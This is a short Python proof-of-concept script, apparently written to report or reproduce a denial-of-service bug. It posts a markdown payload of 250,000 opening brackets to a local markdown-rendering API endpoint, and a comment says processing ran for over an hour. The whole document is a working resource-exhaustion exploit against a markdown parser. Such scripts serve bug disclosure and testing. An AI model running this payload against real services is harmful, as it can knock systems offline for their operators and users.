import requests
import json
# Can be quite large. This ran for at least an hour (and counting)
payload = "[" * 250000
rep = requests.post("http://localhost:8080/api/v1/utils/markdown", json={
    "md": payload
})